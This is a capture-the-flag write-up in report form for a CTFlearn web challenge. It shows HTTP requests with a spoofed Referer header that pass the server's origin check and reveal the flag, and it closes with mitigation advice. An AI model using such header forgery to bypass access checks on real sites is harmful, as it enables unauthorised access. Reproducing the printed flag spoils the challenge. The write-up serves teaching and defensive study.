# Vulnerability Assessment and Penetration Testing (VAPT) Report – HTTP Header Manipulation

**Prepared by:** Nishanth Antony  
**Date:** August 24, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation  
**Platform:** CTFlearn  

---

## 1. Reconnaissance Steps  
**Objective:** Identify vulnerabilities related to HTTP headers in the application.  
**Commands Used:**  
- None (manual inspection via Burp Suite).  

**Findings:**  
- Challenge titled "Don’t Bump Your Header" hinted at HTTP header manipulation.  
- Initial GET request to `header.php` showed the application checked headers (e.g., User-Agent, Referer).  
- Response suggested header modification was required to access the flag.  

---

## 2. Exploitation Process  
**Step 1 – Request Interception**  
- Intercepted GET request to `header.php` using Burp Suite.  
- Initial request and response:  
  ```http
  Request:
  GET /header.php HTTP/1.1
  Host: 165.227.106.113
  Cache-Control: max-age=0
  DNT: 1
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Connection: keep-alive
  ```
  ```http
  Response:
  HTTP/1.1 200 OK
  Server: nginx/1.4.6 (Ubuntu)
  Date: Thu, 31 Jul 2025 06:01:20 GMT
  Content-Type: text/html
  Connection: keep-alive
  X-Powered-By: PHP/5.5.9-1ubuntu4.22
  Content-Length: 01

  Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
  <!-- Sup3r3cr3tAg3nt -->
  ```

**Step 2 – Header Manipulation**  
- Modified User-Agent header to `http://ctflearn.com/challenge` in Burp Suite.  
- Received hint in response to adjust Referer header.  
- Changed Referer header to `http://awesomesauce.com` in a new request.  
- Modified request and successful response:  
  ```http
  Request:
  GET /header.php HTTP/1.1
  Host: 165.227.106.113
  Cache-Control: max-age=0
  DNT: 1
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Referer: http://awesomesauce.com
  Connection: keep-alive
  ```

  ```http
  Response:
  HTTP/1.1 200 OK
  Server: nginx/1.4.6 (Ubuntu)
  Date: Thu, 31 Jul 2025 05:59:48 GMT
  Content-Type: text/html
  Connection: keep-alive
  X-Powered-By: PHP/5.5.9-1ubuntu4.22
  Content-Length: 01

  Here is your flag: flag{did_this_m3ss_with_your_h34d}
  <!-- Sup3r3cr3tAg3nt -->
  ```

**Step 3 – Flag Retrieval**  
- Submitted the flag `flag{did_this_m3ss_with_your_h34d}` extracted from the response.  

---

## 3. Proof of Concept (PoC)  
- **Header Manipulation:**  
  - Intercepted request and modified:  
    ```http
    GET /header.php HTTP/1.1
    Host: web.ctflearn.com
    Referer: http://awesomesauce.com
    User-Agent: Mozilla/5.0
    ```
  - Response included: `Here is your flag: flag{did_this_m3ss_with_your_h34d}`.  

---

## 4. Privilege Escalation  
- Not applicable; challenge focused on header manipulation for flag retrieval.  

---

## 5. Mitigation Recommendations  
- **Header Validation:**  
  - Avoid relying on client-controlled headers (e.g., Referer, User-Agent) for security decisions.  
- **Server-Side Authorization:**  
  - Implement session-based authentication with server-side validation.  
- **Logging and Monitoring:**  
  - Log header values and monitor for suspicious patterns.  
- **Secure Development Training:**  
  - Educate developers on risks of trusting client-side data.  
- **HTTP Security Headers:**  
  - Use headers like `Strict-Transport-Security` and `X-Frame-Options` to enhance security.  

---

## 6. Lessons Learned  
- **Header Trust Issues:** Client-controlled headers are easily manipulated, posing security risks.  
- **Tool Usage:** Burp Suite is effective for testing and exploiting header-based vulnerabilities.  
- **Server-Side Security:** Proper server-side checks are essential to prevent unauthorized access.  

---

## 7. Skills Practiced  
- HTTP header manipulation (Burp Suite)  
- Web request interception and analysis  
- Understanding header-based vulnerabilities  
- Secure reporting and mitigation strategies  
